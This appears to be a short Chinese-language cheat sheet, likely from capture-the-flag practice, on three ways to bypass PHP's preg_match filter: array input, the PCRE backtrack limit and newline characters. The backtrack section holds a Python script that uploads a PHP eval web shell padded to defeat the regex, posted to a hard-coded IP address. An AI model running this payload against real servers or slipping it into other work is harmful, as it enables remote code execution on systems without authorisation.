#  preg_match绕过

1. 数组绕过

   ​	preg_match只能处理字符串，传入数组时会返回false

2. PCRE回溯次数限制

     ```python
     import requests
     from io import BytesIO
     
     files = {
       'file': BytesIO(b'aaa<?php eval($_POST[txt]);//' + b'a' * 1000000)
     }
     
     res = requests.post('http://51.158.75.42:8088/index.php', files=files, allow_redirects=False)
     print(res.headers)
     
     ```

   脚本，`pcre.backtrack_limit`给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false。

3. 换行符绕过（preg_match默认单行模式）

    	 `.` 不会匹配换行符，可以使用换行符绕过：`\n` (`%0A`)